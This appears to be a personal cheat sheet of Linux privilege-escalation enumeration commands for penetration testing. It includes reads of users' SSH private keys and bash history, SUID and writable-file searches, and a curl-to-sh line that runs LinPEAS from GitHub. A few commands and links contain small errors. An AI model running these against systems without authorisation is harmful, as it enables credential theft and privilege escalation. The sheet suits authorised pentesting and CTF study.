File enumeration:
---
#file #enum #enumeration 

```shell
cat /etc/passwd
```

Get users with shell rights:
```shell
cat /etc/passwd | grep sh$
```

Get all files with SUID / SGID bit set:

```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -lsa {} \; 2> /dev/null
```

```shell
find / -perm -u=s -type f 2>/dev/null
```

Find all files owned by current user:

```shell
find / -user $(whoami) 2>/dev/null | grep -v "^/run\|^/proc\|^/sys"
```

Others

```bash
for file in $(find / -type -f -name *.conf 2>/dev/null); do grep -lF nopass $file;done
```

```shell
cat /etc/group
```

```shell
cat /etc/crontab
```

```shell
echo $PATH #check for unusual paths
```

```shell
sudo -l #check for LD_PRELOAD priv esc as well
```

```shell
uname -a
```

```shell
cat /etc/*-release
```

```shell
grep -E '^(VERSION|NAME)=' /etc/os-release
```

```shell
netstat -antup
```

```shell
ps aux | grep "^root"
```

```shell
cat /home/USERNAME/.ssh/id_rsa
```

```shell
file /bin/bash
```

Output all files writeable by the user:
```shell
find / -writable -type f 2>/dev/null
```

```shell
#check if writeable
ls -l /etc/passwd /etc/shadow;
```

```shell
cat /etc/passwd | grep -iE 'sh|bash|zsh'
```

Find specific file
```shell
find / -name "$FILE" -type f 2>/dev/null
```

Find specific directory
```shell
find / -name $DIR -type d 2>/dev/null
```

```shell
find / -perm -g=s -type f 2>/dev/null
```

```shell
find / -group GROUP_NAME 2>/dev/null
```

```shell
crontab -u $USER -l
```

```shell
id
```

```shell
cat /etc/fstab
```

```shell
cat /etc/issue
```

```shell
lsb_release -a
```

```shell
ss -tunlp
```

```shell
#Find all group writeable files (remove type f for symlinks): 
find / -writeable -group $GROUP_NAME -type f 2>/dev/null
```

find and cat .bash_history
```shell
find -name ".bash_history" -exec cat {} \;
```
---
Get linux version / distro info:
---
```shell
uname -a;echo;cat /proc/version;echo;cat /etc/*-release
```
---
Get SUID binaries:
---
```shell
2>/dev/null find / -perm -4000 -exec ls -l {} \;
```

```shell
find / -perm -u=s -type f 2>/dev/null
```
---
Get files with capabilities?:
---
#getcap #capabilities

```shell
getcap -r / 2>/dev/null
```
---

Files for auto enumeration:
---
#lse #linpeas #enumeration #enum4linux 

LinPEAS:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

Linux Smart Enumeration (LSE):
```
/usr/share/linux-smart-enumeration
```
[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

LinEnum.sh:
https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
---